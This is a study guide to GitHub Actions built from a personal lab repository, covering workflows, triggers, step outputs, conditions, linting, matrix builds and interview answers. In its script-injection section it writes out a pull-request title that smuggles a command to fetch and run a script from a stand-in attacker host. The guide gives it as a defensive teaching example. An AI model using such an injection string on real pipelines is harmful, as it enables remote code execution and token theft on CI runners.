# GitHub Actions: the complete guide from the actions-lab

This guide explains everything built and learned in the `actions-lab` repository, in the order it was learned. Every concept has the reason it exists, a small example from this repo, and the mistakes that were actually made along the way, because those mistakes are the best interview stories. Read it top to bottom before an interview and the whole picture fits together.

It covers Levels 0 to 3 so far. New sections are added as each level is finished.

---

## Part 1. The big picture

### What CI/CD is and why it exists

A team's checklist ("run the tests, build the image, scan it") used to depend on a person remembering to do it. Continuous integration (CI) replaces that memory with a robot: every change is built and tested automatically, every time, and a change that fails is stopped before it reaches the main branch. Continuous delivery (CD) goes one step further and keeps every change ready to release, so production deployment becomes a routine, approved step. Continuous deployment releases to production automatically once all checks pass, with no human approval.

GitHub Actions is GitHub's built-in CI/CD system. Pipelines are YAML files stored in the repository, so they are versioned, reviewed in pull requests, and changed like any other code.

### The core model: event, workflow, job, step

Everything in GitHub Actions follows one chain. An event happens (a push, a pull request, a schedule, a button click). GitHub looks for workflows that listen for that event. A workflow contains one or more jobs. Each job runs on its own machine, called a runner. A job contains steps, which run one after another on that machine.

A kitchen is a useful picture. The event is an order arriving. The workflow is the recipe card for that kind of order. Each job is a cook, and every cook is given a brand-new, empty kitchen, which is thrown away when the cook finishes. The steps are the instructions on the recipe, done in order. Actions are ready-made ingredients you use instead of making them yourself.

The single most important consequence of this picture is that every job starts on a fresh, empty machine. Nothing from your repository, nothing from a previous job, and nothing from a previous run is there unless you bring it.

### Where workflow files live

GitHub only reads workflow files from one exact folder: `.github/workflows/` at the root of the repository. A file anywhere else, or in a folder with a slightly different name such as `.github/workflow/`, is silently ignored. Both `.yml` and `.yaml` extensions work, and each file is a separate workflow.

In this lab the repository contained both `hello.yml` and `hello.yaml` by accident. GitHub treated them as two independent workflows, both listening to `push`, so every push produced two runs: one passing and one failing. Both files used `name: hello`, so the Actions page looked like one workflow behaving strangely. The lessons are to pick one extension for the whole repository, to give every workflow a unique `name:`, and to count the runs per commit whenever a workflow behaves oddly. Two runs for one push means two workflows are listening.

### Runners: who provides the machine

`runs-on:` chooses the machine for a job. GitHub-hosted runners such as `ubuntu-latest`, `windows-latest` and `macos-latest` are fresh virtual machines created for each job and destroyed afterwards. GitHub maintains their images and preinstalls common tools. They are free for public repositories; private repositories use a monthly allowance of minutes, and macOS runners use those minutes about ten times faster than Linux.

Self-hosted runners are your own machines or Kubernetes pods running GitHub's runner agent. They are used when a job must reach a private network (for example, inside an AWS VPC, which a GitHub-hosted runner cannot reach), needs special hardware, or needs cheaper bulk minutes. A self-hosted runner is not a clean machine for every job unless you make it ephemeral, which is an important security point. Larger runners are GitHub-hosted runners with more CPU, memory or a static IP address, and they are paid.

---

## Part 2. The first workflow

### A minimal workflow, line by line

```yaml
name: hello

on: push

jobs:
  say-hello:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - run: echo "Hello from a GitHub runner"
      - run: pwd
      - run: ls -la
```

`name:` is the display name in the Actions tab. `on: push` is the event: run this on every push. `jobs:` holds the jobs, and `say-hello:` is a job ID that you choose. `runs-on:` picks the runner. `steps:` is the list of instructions, and each line starting with `-` is one step.

### YAML basics you need

Indentation is structure in YAML. It must be spaces, never tabs, and it must be consistent, normally two spaces per level. `key: value` sets something, with a colon followed by a space. A line starting with `- ` is one item in a list, which is why every step begins with a dash. `[main]` is a short way to write a one-item list, identical to writing `- main` on the next line.

Indentation changes meaning, not only appearance. In this lab, `schedule:` was accidentally indented under `workflow_dispatch:` instead of beside it. YAML read it as a setting inside `workflow_dispatch` rather than as a separate trigger, GitHub accepted the file, and the schedule simply never existed. There was no error.

### `run` versus `uses`

A `run:` step executes your own shell command. A `uses:` step runs an action, which is packaged code written by someone else. The part before `@` names the repository that contains the action, and the part after `@` is the version. `actions/checkout@v5` is the repository `github.com/actions/checkout` at the tag `v5`.

### The empty kitchen in practice: why `actions/checkout` exists

The first version of the hello workflow had no checkout step and ran `ls -la` and `cat README.md`. The listing showed only `.` (the folder itself) and `..` (its parent), meaning the folder was empty, and `cat` failed with "No such file or directory". GitHub reads the workflow file on its own servers to know what to run, but it does not copy the repository onto the runner. `actions/checkout` does that: it clones the repository into the working folder at the exact commit that triggered the run.

The checkout log is worth reading once. It authenticates with an automatically created token (`GITHUB_TOKEN`), and by default fetches only the single commit that triggered the run, which is a shallow clone with `fetch-depth: 1`. Tools that need history, such as `git log`, deriving a version from tags, or Gitleaks scanning the full history, find almost nothing until you set `fetch-depth: 0`. At the end of the job, checkout's post-job cleanup removes the stored token from the git configuration, so credentials do not outlive the step that needed them.

Check out code only when a step needs the repository's files. A deploy job that only uses a built image often skips checkout entirely, which is faster and exposes less.

### The workspace path

On a Linux GitHub-hosted runner the working folder is `/home/runner/work/<repo>/<repo>`. The repository name appears twice: the outer folder belongs to the repository on that runner, and the inner one is the workspace where checkout places the code and where every `run:` step starts. Steps can read this path from `$GITHUB_WORKSPACE`.

### Exit codes decide success

Every command returns an exit code. Zero means success and anything else means failure. If a step's command returns non-zero, the step fails, the job turns red, and later steps are skipped unless told otherwise. A pipeline is a chain of commands that must each return zero.

### Tags, commits and why pinning matters

When a workflow says `uses: actions/checkout@v5`, the log shows the tag being resolved to a specific commit SHA at that moment. A tag is a movable label; whoever owns the action can point `v5` at different code tomorrow, and your pipeline would run it without any change on your side. Production pipelines therefore pin third-party actions to a full commit SHA, with a comment showing the version, and use Dependabot to update them. This is covered fully in the security level.

### Default environment variables

GitHub sets many variables in every job. The ones used so far are `GITHUB_SHA` (the commit being built), `GITHUB_EVENT_NAME` (which event started the run), `GITHUB_REF` (the branch, tag or other ref being built), `GITHUB_WORKSPACE` (the workspace path) and `GITHUB_RUN_NUMBER` (a counter of runs for this workflow, starting at 1, often used for build numbers).

### Re-runs

A run always belongs to one commit and uses the workflow file as it was in that commit. Clicking "Re-run jobs" on an old failed run repeats the same commit with the same workflow version, so a fixed workflow file does not help an old run. A new run from a new commit is needed. In this lab the first run failed because it had no checkout, and it stays red permanently because that commit really did contain a broken workflow.

---

## Part 3. Triggers: deciding when a workflow runs

### Why triggers matter

Running CI at the wrong time, such as on every README typo, fills the queue, wastes minutes, and trains people to ignore results. `on:` controls exactly when a workflow runs.

### The full form of `on:`

```yaml
on:
  push:
    branches: [main]
    paths-ignore: ["**.md"]
  pull_request:
    branches: [main]
  workflow_dispatch:
  schedule:
    - cron: "37 7 * * *"
```

Each key under `on:` is one trigger, and all of them sit at the same indentation level.

### `push` with branch and path filters

`branches: [main]` limits the trigger to pushes to `main`; pushes to other branches are ignored. `paths-ignore: ["**.md"]` skips the run when every changed file ends in `.md`, where `**` means any folder at any depth. Both filters must allow the push, so they combine as AND. If a single push changes both a Markdown file and a code file, the workflow runs, because not every changed file matches the ignore pattern. The opposite filter, `paths:`, runs the workflow only when matching files change, which is how each lab workflow was later restricted to its own file. One event cannot use both `paths` and `paths-ignore`.

This was tested by pushing a README-only change. No run appeared, which proved the filter rather than assuming it.

### `pull_request`, and the merge preview

For pull requests, `branches:` filters the target (base) branch, not the source branch. `pull_request: branches: [main]` means pull requests into `main`, from any branch. This is easy to misread and decides whether CI guards `main` at all.

By default, `pull_request` fires on three activity types: `opened`, `synchronize` (new commits pushed to the PR branch) and `reopened`. Other activity, such as `closed` or `labeled`, needs `types:` to be listed explicitly.

The most surprising lesson of this level: a pull request run does not test your branch on its own. GitHub builds a temporary merge commit of your branch into the current `main` and tests that. In this lab the run showed `ref=refs/pull/1/merge` and a SHA that was neither the branch commit nor anything on `main`. This catches the case where a branch passes alone but breaks when combined with something merged into `main` since the branch was created. Three consequences follow. The SHA in a PR run is not your commit; when a tool needs the branch's real latest commit, use `github.event.pull_request.head.sha`. If `main` moves, the merge preview is rebuilt, which is why repositories can require branches to be up to date before merging. If the pull request has a merge conflict, `pull_request` workflows do not run at all, because there is nothing to build.

Pushing a second commit to the open pull request started a new run on its own (the `synchronize` activity) and produced a new merge SHA, because the preview is rebuilt whenever either side changes. The ref name stayed `refs/pull/1/merge`, but it pointed to a different commit.

### Merging

Opening and updating a pull request runs the `pull_request` trigger, which tests the preview. Clicking Merge creates a real merge commit on `main`, which is a push to `main` and runs the `push` trigger, which tests what actually landed. The preview commit and the real merge commit have different SHAs even with identical content, because a SHA also covers the timestamp and committer. The exact commit tested in the pull request is therefore never the exact commit on `main`, which is why the post-merge run on `main` is kept. Large teams use merge queues to test the exact commit that will land.

### `workflow_dispatch`: the manual button

`workflow_dispatch:` adds a "Run workflow" button in the Actions tab. A manual run builds the latest commit of the branch you choose. It can take inputs, which appear as a form:

```yaml
on:
  workflow_dispatch:
    inputs:
      simulate_failure:
        description: "Make the build fail on purpose"
        type: boolean
        default: false
```

Input types are `boolean` (a checkbox), `string`, `choice` (a dropdown) and `number`. Steps read the values from the `inputs` context, for example `${{ inputs.simulate_failure }}`. On a push there is no form, so the value is empty.

### `schedule`: the clock

`schedule:` takes a list of cron expressions with five fields: minute, hour, day of month, month and day of week. The value must be quoted, because in YAML a value starting with `*` means something else. Cron in GitHub Actions is always UTC, so `30 7 * * *` is 2:30 in New York in winter and 3:30 in summer. The shortest allowed interval is every five minutes, and only the workflow file on the default branch counts.

Scheduled runs are best effort. In this lab a schedule of every fifteen minutes, which should have produced about a hundred runs, produced six in 37 hours, at irregular times and never on the quarter hour. GitHub delays or drops scheduled runs when it is busy, especially at the top of the hour, and in public repositories scheduled workflows are disabled after 60 days without repository activity. Use odd minutes such as `37`, never rely on a schedule for anything time-critical, add an alert that fires when an important scheduled job has not succeeded within its expected window, and when timing truly matters, trigger the workflow through `workflow_dispatch` from a reliable external scheduler such as EventBridge Scheduler.

### The event name rule

`GITHUB_EVENT_NAME` is always exactly the key under `on:` that fired: `push`, `pull_request`, `workflow_dispatch` or `schedule`. A condition such as `if: github.event_name == 'scheduled'` would never be true, which is a silent bug.

### Refs, and how to check them

A ref is a name that points to a commit. `refs/heads/main` is the branch `main`. `refs/tags/v1.0` is a tag. `refs/remotes/origin/main` is your machine's memory of where GitHub's `main` was at your last fetch. `refs/pull/N/head` and `refs/pull/N/merge` are GitHub's hidden pull request refs. `HEAD` points to the branch you are on, which in turn points to a commit.

To check what a run built: `git ls-remote origin` lists every ref on GitHub with its SHA. `git rev-parse main origin/main` turns ref names into SHAs on your machine. `cat .git/HEAD` shows the branch you are on. `git show --no-patch --format='commit %H%nparents %P' <sha>` shows a commit's parents; a merge commit has two, the previous `main` and the branch's last commit. After the merge in this lab, `refs/pull/1/merge` disappeared and `refs/pull/1/head` stayed as a permanent record of the pull request.

The push output line `old..new main -> main` shows where the remote branch was before and after each push, so the new value of one push becomes the old value of the next. `git log --oneline old..new` lists every commit between two points, which answers the common incident question "what changed since the last good deploy?"

### Two ways a workflow file fails

A workflow can be rejected or silently wrong. In this lab, `pull_requests:` instead of `pull_request:` made GitHub reject the whole file. Nothing ran, and the Actions sidebar showed the file path instead of the workflow name, which is the quick sign of an unparseable file. Silent failures are worse: `corn` instead of `cron`, the misindented `schedule`, and the duplicate `.yaml` file all produced no error and simply did the wrong thing.

---

## Part 4. Data inside a workflow

### Each step is a new shell

A variable set in one step does not exist in the next step, even within the same job. Each step runs in a new shell process; when it ends, its variables are gone. Steps share the runner's filesystem, but not shell variables. In this lab, the Build step set `VERSION` and the Deploy step printed it as empty.

### `$GITHUB_ENV`: passing values to later steps in the same job

```bash
echo "VERSION=$VERSION" >> "$GITHUB_ENV"
```

`$GITHUB_ENV` is a file path the runner provides. After each step, the runner reads that file and sets the variables it contains for every following step in the same job. `>>` appends; a single `>` would erase anything earlier steps wrote. The format inside the file is `NAME=value`, because it is a plain text file written by the shell, not YAML.

### `$GITHUB_OUTPUT`: named step outputs

```yaml
- name: Build
  id: version
  run: echo "version=1.0.${GITHUB_RUN_NUMBER}" >> "$GITHUB_OUTPUT"
- run: echo "Deploying ${{ steps.version.outputs.version }}"
```

A step with an `id` can declare outputs by writing `name=value` lines to `$GITHUB_OUTPUT`. Later steps read them as `${{ steps.<id>.outputs.<name> }}`. Outputs are explicit about which step produced a value, and they can be used in places that cannot read shell variables, such as `if:` conditions, action inputs under `with:`, and other jobs.

### Three different identifiers

A job ID is the key under `jobs:`, such as `build:`; `needs:` and `needs.<job>.outputs` use it. A step name (`name:`) is display text for logs and cannot be referenced. A step ID (`id:`) is what `steps.<id>` uses, and only within the same job. Using the same word for a job ID and a step ID works but reads ambiguously, so naming a step by what it produces, such as `id: version`, is clearer.

### Expressions and why `${{ }}` is copy and paste

`${{ ... }}` is an expression. GitHub evaluates it and pastes the result into the step's text before the shell starts. The log proves it: a step written as `echo "Deploying ${{ steps.build.outputs.version }}"` appears in the log as `Run echo "Deploying version 1.0.5"`, while a step using `$VERSION` appears with the variable name, because the shell expands it later.

That makes expressions dangerous inside `run:` when the value comes from someone else. A pull request title is chosen by whoever opens the pull request. If a step contains `echo "${{ github.event.pull_request.title }}"` and the title is `fix"; curl https://evil.example/x.sh | bash; echo "`, the shell receives that text as code and runs the attacker's command. This is script injection, a real and common vulnerability. The safe pattern passes untrusted values through `env:`, where the shell treats them as data:

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking PR: $PR_TITLE"
```

Expressions are fine in `if:`, `with:` and `env:`, and for values you control, such as your own step outputs. Inside `run:`, use environment variables, especially for anything a user can type: titles, branch names, issue text and commit messages.

### Jobs and the output relay

Each job runs on its own machine, so `$GITHUB_ENV` cannot cross jobs. Values cross jobs through a relay of three steps: a step output, declared as a job output, read by a dependent job through `needs`.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.version }}
    steps:
      - id: version
        run: echo "version=1.0.${GITHUB_RUN_NUMBER}" >> "$GITHUB_OUTPUT"
  deploy:
    runs-on: ubuntu-latest
    needs: build
    steps:
      - env:
          VERSION: ${{ needs.build.outputs.version }}
        run: echo "Deploying version $VERSION"
```

`outputs:` on the job exports the step output; without it, the value stays inside the job and `needs.build.outputs.version` is an empty string with no error. `needs: build` does two things: the deploy job waits for build to succeed, and it can read build's outputs. Without `needs`, jobs run in parallel on separate machines. The build log shows "Evaluate and set job outputs" at the end of the job, which is where the value is collected before the runner is thrown away.

### Conditions with `if:` and status functions

`if:` decides whether a step or a whole job runs. Every step without an `if:` implicitly has `if: success()`, which means "nothing has failed in this job so far", not "the previous step passed". Once any step fails, the job's status stays failed, and every later step without a special condition is skipped. `failure()` is true when something earlier failed, which makes it right for notifications and collecting debug information. `always()` runs whatever happened, even after a cancellation, which makes it right for cleanup. `cancelled()` is true when the run was cancelled.

If step 2 fails, step 3 has `if: failure()`, and step 4 has no condition, then step 3 runs, step 4 is skipped, and the job is red. Step 3 succeeding does not undo the failure. If step 2 had `continue-on-error: true`, its failure would be forgiven: the job would be treated as successful, `failure()` would be false, step 4 would run, and the job would end green with a warning, which is why `continue-on-error` can hide real failures and must be used carefully.

A job-level condition such as `if: github.ref == 'refs/heads/main'` restricts a whole job, such as deployment, to the main branch. On a pull request `github.ref` is `refs/pull/N/merge`, so the job is skipped. In this lab the condition was first written as `refs/head/main`, without the `s`. That is a valid string, so nothing complained, and deployment would have been skipped on every run including real pushes to `main`.

### Contexts: everything GitHub knows about a run

Contexts are structured objects GitHub fills in for each run: `github`, `env`, `vars`, `secrets`, `inputs`, `runner`, `job`, `steps`, `needs` and `matrix`. To find field names, dump a context once in a test run through the safe pattern:

```yaml
- env:
    GITHUB_CONTEXT: ${{ toJSON(github) }}
  run: echo "$GITHUB_CONTEXT"
```

GitHub masks secrets in logs automatically; the `token` field printed as `***`. Real repositories should not dump whole contexts in permanent logs.

The most useful fields seen in the dump: `run_id` and `run_attempt` identify a run uniquely, and `run_attempt` increases on re-run. `ref_name` and `ref_type` give the short branch or tag name and say whether a tag triggered the run, which release pipelines use. `head_ref` and `base_ref` hold the source and target branch names on pull requests. `actor` is who started the original run and `triggering_actor` is who triggered this attempt, which matters for audit on re-runs. `workflow_ref` and `workflow_sha` identify the workflow file and commit, which OIDC trust policies use. `event` is the raw webhook payload, whose shape differs per event and which contains user-controlled text. `runner.environment` says `github-hosted` or `self-hosted`, and `runner.temp` is a scratch folder wiped after the job.

Expression functions include `startsWith`, `endsWith`, `contains`, `format`, `toJSON` and `hashFiles`. `startsWith(github.ref, 'refs/heads/feature/')` checks for a feature branch. Shell syntax such as `${SHA:0:7}` is separate from expressions and runs inside `run:`.

### Environment variable levels and precedence

`env:` can be set at the workflow level (every job), the job level (every step in that job) and the step level (that step only). The closest definition wins: a step looks upward and takes the first definition it finds, so step beats job and job beats workflow. In this lab, a workflow-level `REGION=us-east-1` was overridden by a job-level `REGION=eu-west-1`, so a step with no `env:` printed `eu-west-1`, which surprised the prediction. Set each value at the narrowest level that needs it, and put secrets only on the step that uses them, so no other step or third-party action can read them.

### Repository variables and secrets

Repository variables (Settings, Secrets and variables, Actions, Variables) hold non-secret configuration shared by every workflow, read as `${{ vars.NAME }}`. Secrets are encrypted, masked in logs and read as `${{ secrets.NAME }}`. The rule of thumb: if it would be fine on a billboard, it is a variable; otherwise it is a secret.

### Job summaries

Markdown written to `$GITHUB_STEP_SUMMARY` appears on the run's main page below the job graph, as a readable report for people who never open logs. Grouping several echo lines with `{ ...; } >> "$GITHUB_STEP_SUMMARY"` redirects them all at once. Real pipelines use summaries for test results, coverage, Terraform plans and scan findings.

### Guarding required values in shell

`set -u` makes the shell fail on unset variables, which would have caught the typo `GUTHUB_RUN_NUMBER` that silently produced the version `1.0.`. But `env: APP_NAME: ${{ vars.APP_NAME }}` always defines `APP_NAME`, as an empty string if the variable is missing, so `set -u` does not catch it. `: "${APP_NAME:?APP_NAME is empty or missing}"` fails when a variable is unset or empty, with a clear message. Use it for every value a step must have.

### Three languages in one file, and the `:`, `==`, `=` rules

A workflow file mixes three languages. YAML is the structure outside `run:` blocks and expressions, and always uses `key: value` with a colon and a space. Expressions inside `${{ }}` and in `if:` compare with `==`, `!=`, `&&` and `||`. Shell inside `run:` assigns with `NAME=value` and no spaces, and compares with `=` surrounded by spaces inside `[ ]`.

The mistakes from this lab all came from mixing them. `VERSION= ${{ ... }}` under `env:` was shell syntax in a YAML place; YAML needs `VERSION: ...`. `[ "$A" = "true"]` was missing the space before `]`; in bash, `[` is a command and `]` must be a separate final argument, and inside an `if` the resulting error is treated as false, so the failure branch never ran. The question to ask is always: am I in YAML, inside `${{ }}`, or inside `run:`?

---

## Part 5. Checking workflows before they run

### actionlint and shellcheck

`actionlint` is the closest equivalent to `terraform validate` for workflows. It checks YAML structure, unknown keys such as `pull_requests` and `corn`, indentation, invalid expressions, references to steps or jobs that do not exist, and, with `shellcheck` installed, shell bugs inside `run:` blocks. Installed with `brew install actionlint shellcheck` and run as `actionlint` from the repository root, it caught the bracket bug. It cannot catch wrong values that are valid strings, such as `refs/head/main` or a misspelled path, so testing by running is still required. Linters catch broken code, not wrong values.

### Layers of checking

In the editor, GitHub's official VS Code extension underlines invalid keys and autocompletes contexts and inputs. On commit, a git pre-commit hook runs actionlint and refuses the commit if it fails:

```bash
printf '#!/bin/sh\nexec actionlint\n' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit
```

Hooks are not committed to the repository and can be skipped with `git commit --no-verify`, so each person must install them; the pre-commit framework solves that with a shared configuration file. In CI, an actionlint job on every pull request, required by a branch rule, is the real gate that applies to everyone. Workflow changes should be tested on a branch and pull request, not pushed straight to `main`. `act` can run workflows locally in Docker as an approximation, though it differs from GitHub's runners.

---

## Part 6. Orchestration (Level 3, in progress)

### The lab application

`services/` contains three small services in the three languages used by the Stratus project: `python-svc` (Python with uv and pytest), `node-svc` (Node with the built-in test runner) and `java-svc` (Java with Maven and JUnit 5). One workflow, `ci.yml`, builds and tests all of them and grows through this level. The workflow only runs when service code or the workflow itself changes, through `paths: ["services/**", ".github/workflows/ci.yml"]`.

### `defaults.run.working-directory`

```yaml
defaults:
  run:
    working-directory: services/python-svc
```

Every `run:` step in the job starts in that folder instead of each step running `cd`. It does not apply to `uses:` steps, which always start at the workspace root, so an action input such as `node-version-file` needs the full path from the repository root. In this lab that path was first written as `service/node-svc/.nvmrc`, missing an `s`; actionlint could not catch it because it is a valid string, and the action's error message printed the full path it looked for, which made the bug visible. Reading the whole error line, not only the word "Error", is the habit.

### Lock files and locked installs

A project file states acceptable version ranges, such as `pytest>=8`. A lock file records exactly which versions were installed, including transitive dependencies, with checksums. `uv.lock` for Python and `package-lock.json` for Node were created locally and committed. CI installs with commands that refuse to change the lock file: `uv sync --locked` and `npm ci` both install exactly what is locked and fail if the project file and lock file disagree, which catches someone changing dependencies without updating the lock. `npm install` can quietly modify the lock file, so it is never used in CI. Lock files make versions reproducible; a repository manager such as Nexus keeps those versions available even if the public registry has an outage or deletes a package.

### Pinning the runtime version

A lock file pins packages, not the language runtime. In this lab the Mac ran Python 3.13.16 while the runner used its system Python 3.12.3, because `requires-python = ">=3.12"` is a range and uv used whatever matching Python each machine had. This is the classic source of "works on my machine". CI must test the runtime production runs. `uv python pin 3.13` wrote a `.python-version` file that uv reads on every machine, downloading that Python if needed; the runner then used 3.13.18. Pinning the minor version (`3.13`) allows patch updates, which only contain fixes; pinning the full version or a Docker image digest gives a bit-for-bit match. For Node, `.nvmrc` containing `24` plays the same role, read by `actions/setup-node` through `node-version-file`. For Java, `actions/setup-java` with `java-version: "21"` installs the JDK, and `maven.compiler.release` set to 21 in the pom makes even a newer local JDK produce Java 21 bytecode and reject newer APIs. Versions are quoted in YAML so they are not read as numbers.

### Matrix builds

```yaml
strategy:
  fail-fast: false
  matrix:
    python: ["3.13", "3.14"]
env:
  UV_PYTHON: ${{ matrix.python }}
```

A matrix creates one copy of the job per value, running in parallel on separate runners. Each copy reads its value from `${{ matrix.python }}`, and GitHub appends the value to the job name, giving `python (3.13)` and `python (3.14)`. `UV_PYTHON` overrides `.python-version` for that copy. By default, one failing matrix job cancels the others; `fail-fast: false` lets all finish so every incompatible version is visible. The pin says what production runs; the matrix tests what you are about to run. The lab proved the code works on 3.14 before any production change, which is how runtime upgrades are made safely.

### Parallel jobs

Jobs without `needs:` between them run at the same time. Adding a separate `node` job alongside the two Python matrix jobs produced three jobs side by side in the run graph.

### Setup actions and how to learn their inputs

`astral-sh/setup-uv`, `actions/setup-node` and `actions/setup-java` install tools on the runner. Inputs are passed under `with:` and must be indented under it. Every action documents its inputs in its repository's README, found at `github.com/<owner>/<repo>`, the part of `uses:` before `@`. The authoritative list is the `action.yml` file in that repository, which declares each input's description, whether it is required, and its default; it can be read for an exact version with `curl -s https://raw.githubusercontent.com/actions/setup-java/v5/action.yml`. The Releases page shows the current major version, and its changelog should be read before upgrading a major version, because inputs can change. The repository's main page shows the default branch's README; the branch and tag selector shows it for a specific version.

`actions/setup-java` needs `distribution` (for example `temurin`, `corretto` or `zulu`, which are different builds of OpenJDK) and sets `JAVA_HOME` automatically for later steps.

### Maven essentials for a DevOps engineer

The `pom.xml` defines a project's coordinates (`groupId`, `artifactId`, `version`), which are its unique name in any Maven repository including Nexus. A version ending in `-SNAPSHOT` is work in progress that may be overwritten; a version without it is an immutable release. Dependencies with `scope` set to `test`, such as JUnit, are used only for tests and never packaged. The surefire plugin runs tests during the `test` phase. Code lives in `src/main/java`, tests in `src/test/java`, and build output goes to `target/`, which is ignored by git.

`mvn -B test` runs the lifecycle up to the test phase (validate, compile, test) in batch mode, without colours or prompts, which is the CI form. Maven stores downloads in the local repository `~/.m2/repository`. Locally the first run took 4.7 seconds and the second 2.2 seconds because nothing was downloaded the second time; the local repository held 68 MB. A CI runner starts every job with an empty `~/.m2`, so without a cache every run downloads everything again, which for a real Spring Boot service is hundreds of megabytes. That is the problem caching solves, covered next.

### Two `java` commands on one Mac

Homebrew's Maven launcher points directly at Homebrew's JDK, so `mvn -version` worked while `java -version` failed with "Unable to locate a Java Runtime". Typing `java` runs the macOS stub `/usr/bin/java`, which only looks in `/Library/Java/JavaVirtualMachines`, where Homebrew does not register its JDK. Linking it there fixed it:

```bash
sudo ln -sfn /opt/homebrew/opt/openjdk/libexec/openjdk.jdk /Library/Java/JavaVirtualMachines/openjdk.jdk
```

`JAVA_HOME` was empty because nothing sets it automatically; it is only a convention that tools such as Maven, Gradle and Jenkins agents read. On macOS it is set with `export JAVA_HOME=$(/usr/libexec/java_home)` in `~/.zshrc`. "Which java does this tool actually use?" and "JAVA_HOME is not defined correctly" are classic build agent problems, checked with `which java` and `echo $JAVA_HOME`.

### How much of each language a DevOps engineer needs

A DevOps engineer does not write the application, but must know each stack's build contract well enough to own the pipeline: the build and test commands, where dependencies come from and how they are cached, how versions are pinned, where artifacts and test reports go, and how to read a failure. The payoff is triage. A test assertion failure is the developer's problem. A `401 Unauthorized` from Nexus, unresolvable dependencies after repository maintenance, an unsupported release version caused by the wrong JDK, out-of-memory errors in the test runner, and a full disk are infrastructure problems. A lock file out of sync is the developer's change, caught by the pipeline's gate.

---

## Part 7. Interview questions and model answers

What is the difference between a workflow, a job and a step? A workflow is a YAML file triggered by events. It contains jobs, and each job runs on its own fresh runner. A job contains steps that run in order on that runner, each either running a shell command or using an action.

Why does a pull request run show a SHA that is not my commit? GitHub tests a temporary merge of the branch into the current target branch, so CI checks the result of merging, not the branch alone. The branch's real commit is available as `github.event.pull_request.head.sha`.

How do you pass a value from one job to another? Write it to `$GITHUB_OUTPUT` in a step with an id, export it in the job's `outputs:`, and read it in a job that `needs` the first one through `needs.<job>.outputs.<name>`. `$GITHUB_ENV` only reaches later steps in the same job.

What is script injection in GitHub Actions and how do you prevent it? Expressions are pasted into the script before the shell runs, so user-controlled text such as a pull request title placed directly in `run:` can become a command. Pass untrusted values through `env:` and reference them as shell variables, where they are treated as data.

Our nightly scheduled workflow sometimes does not run. Why? Scheduled workflows are best effort and can be delayed or dropped under load, especially at the top of the hour, and public repositories disable them after 60 days without activity. Use an odd minute, alert on missed runs, and trigger critical jobs from an external scheduler through `workflow_dispatch`.

Why do builds pass locally and fail in CI? The usual causes are different runtime versions, unlocked dependencies, missing files that were never committed, and the fresh runner lacking anything installed on the laptop. Pin the runtime, commit lock files, install with locked commands, and test the same version production runs.

How do you test against several versions? A matrix runs one copy of the job per value in parallel, with `fail-fast: false` so every failing version is visible.

How do you catch workflow mistakes before they run? actionlint with shellcheck locally, in a pre-commit hook and as a required pull request check, plus testing workflow changes on a branch. Linters catch structural and syntax mistakes; wrong values are only caught by running.

When does `if: failure()` run, and why is the job still red? It runs when any earlier step in the job failed. The job stays red because a failure cannot be undone by later successful steps; `continue-on-error: true` is the only way to forgive a step's failure, and it can hide real problems.
